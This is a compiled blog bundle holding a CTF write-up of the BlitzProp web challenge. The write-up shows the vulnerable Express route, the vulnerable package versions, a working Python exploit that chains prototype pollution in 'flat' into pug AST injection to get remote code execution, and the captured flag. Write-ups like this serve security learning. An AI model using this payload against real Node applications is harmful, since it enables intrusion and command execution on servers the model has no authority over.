"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[8909],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>d});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var p=r.createContext({}),s=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},c=function(e){var t=s(e.components);return r.createElement(p.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=s(n),h=a,d=u["".concat(p,".").concat(h)]||u[h]||m[h]||o;return n?r.createElement(d,l(l({ref:t},c),{},{components:n})):r.createElement(d,l({ref:t},c))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,l=new Array(o);l[0]=h;var i={};for(var p in t)hasOwnProperty.call(t,p)&&(i[p]=t[p]);i.originalType=e,i[u]="string"==typeof e?e:a,l[1]=i;for(var s=2;s<o;s++)l[s]=n[s];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},7604:(e,t,n)=>{n.d(t,{Z:()=>o});var r=n(7294);const a={"donate-card":"donate-card_mbts",bmac:"bmac_qmhE"};function o(){return r.createElement("div",{className:"alert alert--primary",role:"alert"},r.createElement("div",{className:"card__body"},r.createElement("p",null,"Thank you for reading!"),r.createElement("p",null,"The information in this blog, as well as all the tools, apps and libraries I develop are currently open source."),r.createElement("p",null,"I would love to keep it this way, and you can help!"),r.createElement("p",null,"You can buy me a coffee from here, which will go towards the next all-nighter I pull off!"),r.createElement("a",{href:"https://www.buymeacoffee.com/kblagoev",target:"_blank"},r.createElement("img",{src:"https://cdn.buymeacoffee.com/buttons/v2/default-violet.png",className:a.bmac,alt:"Buy Me A Coffee"})),r.createElement("p",null,"Or you can support me and my code monthly over at ",r.createElement("a",{href:"https://github.com/sponsors/tihawk",target:"_blank"},"Github Sponsors!")),r.createElement("p",null,"Thanks!")))}},6881:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>h,frontMatter:()=>l,metadata:()=>p,toc:()=>c});var r=n(7462),a=(n(7294),n(3905)),o=n(7604);const l={slug:"blitzprop-cyberapocalypse-2021-ctf",title:"BlitzProp - Cyberapocalypse 2021 CTF",description:"This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},i=void 0,p={permalink:"/blog/blitzprop-cyberapocalypse-2021-ctf",source:"@site/blog/2021-04-30-10:45:31blitzprop-cyberapocalypse-2021-ctf.md",title:"BlitzProp - Cyberapocalypse 2021 CTF",description:"This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",date:"2021-04-30T00:00:00.000Z",formattedDate:"April 30, 2021",tags:[{label:"Cyber Security",permalink:"/blog/tags/cyber-security"},{label:"CTF",permalink:"/blog/tags/ctf"}],readingTime:2.095,hasTruncateMarker:!0,authors:[{name:"Kiril Panayotov Blagoev",title:"Admin",url:"https://github.com/tihawk",imageURL:"https://github.com/tihawk.png",key:"kiroki"}],frontMatter:{slug:"blitzprop-cyberapocalypse-2021-ctf",title:"BlitzProp - Cyberapocalypse 2021 CTF",description:"This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},prevItem:{title:"Input as a Service - Cyberapocalypse 2021 CTF",permalink:"/blog/input-as-a-service-cyberapocalypse-2021-ctf"},nextItem:{title:"CaaS - Cyberapocalypse 2021 CTF",permalink:"/blog/caas-cyberapocalypse-2021-ctf"}},s={authorsImageUrls:[void 0]},c=[{value:"Prompt",id:"prompt",level:3},{value:"Recon",id:"recon",level:3},{value:"Solution",id:"solution",level:3}],u={toc:c},m="wrapper";function h(e){let{components:t,...n}=e;return(0,a.kt)(m,(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("p",null,"This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web."),(0,a.kt)("h3",{id:"prompt"},"Prompt"),(0,a.kt)("p",null,"A tribute page for the legendary alien band called BlitzProp!"),(0,a.kt)("h3",{id:"recon"},"Recon"),(0,a.kt)("p",null,"We're provided with the source code for a cute webpage, which allows us to vote for some song names using an input field."),(0,a.kt)("p",null,"By looking at the song names we're supposed to vote for, we could potentially notice some hints like ",(0,a.kt)("strong",{parentName:"p"},"Polluting")," and ",(0,a.kt)("strong",{parentName:"p"},"AST"),"."),(0,a.kt)("p",null,"The site seems to be running on a ",(0,a.kt)("inlineCode",{parentName:"p"},"node")," environment with an ",(0,a.kt)("inlineCode",{parentName:"p"},"express")," server, so we can check out the routes handling file."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"const path              = require('path');\nconst express           = require('express');\nconst pug               = require('pug');\nconst { unflatten }     = require('flat');\nconst router            = express.Router();\n\nrouter.get('/', (req, res) => {\n    return res.sendFile(path.resolve('views/index.html'));\n});\n\nrouter.post('/api/submit', (req, res) => {\n    const { song } = unflatten(req.body);\n\n        console.log(req.body)\n        console.log(unflatten(req.body))\n\n    if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {\n        return res.json({\n            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })\n        });\n    } else {\n        return res.json({\n            'response': 'Please provide us with the name of an existing song.'\n        });\n    }\n});\n\nmodule.exports = router;\n")),(0,a.kt)("p",null,"Looking closely, we see that the ",(0,a.kt)("inlineCode",{parentName:"p"},"/api/submit")," POST endpoint uses a module called ",(0,a.kt)("inlineCode",{parentName:"p"},"flat")," to unflatten a request body into json. The code also uses ",(0,a.kt)("inlineCode",{parentName:"p"},"pug")," for templating."),(0,a.kt)("p",null,"We can check the versions of these libraries in the ",(0,a.kt)("inlineCode",{parentName:"p"},"package.json")," file."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-json"},'"dependencies": {\n    "express": "^4.17.1",\n    "flat": "5.0.0",\n    "pug": "^3.0.0"\n}\n')),(0,a.kt)("p",null,"The version of flat used seems to be vulnerable to prototype pollution, and we can find information on the payloads we can use ",(0,a.kt)("a",{parentName:"p",href:"https://blog.p6.is/AST-Injection/#Example-1"},"here"),", finding an example exploiting ",(0,a.kt)("inlineCode",{parentName:"p"},"pug"),"."),(0,a.kt)("h3",{id:"solution"},"Solution"),(0,a.kt)("p",null,"By having the exploit at hand, we can write a simple script which will send a POST request with the required ",(0,a.kt)("inlineCode",{parentName:"p"},"song.name")," in the data, as well as with our payload."),(0,a.kt)("p",null,"The payload itself will allow us to do ",(0,a.kt)("em",{parentName:"p"},"Remote Code Execution"),". More to the point, we will cat the flag file into the publically available ",(0,a.kt)("inlineCode",{parentName:"p"},"/static/js")," folder, so we can navigate to it after the pollution exploit."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},'import requests\n\nTARGET_URL = \'http://46.101.44.190:32262\'\n\n# make pollution\nr=requests.post(TARGET_URL + \'/api/submit\', json = {\n    "song.name":"The Goose went wild",\n    "__proto__.block": {\n        "type": "Text", \n        "line": "process.mainModule.require(\'child_process\').execSync(\'cat flag* > static/js/main.js\')"\n    }\n})\n# execute\nrequests.get(TARGET_URL)\nprint(r.text)\n')),(0,a.kt)("p",null,"Now that we have executed our command, we simply go ahead and curl that flag file, and find our flag"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"CHTB{p0llute_with_styl3}\n")),(0,a.kt)(o.Z,{mdxType:"DonateCard"}))}h.isMDXComponent=!0}}]);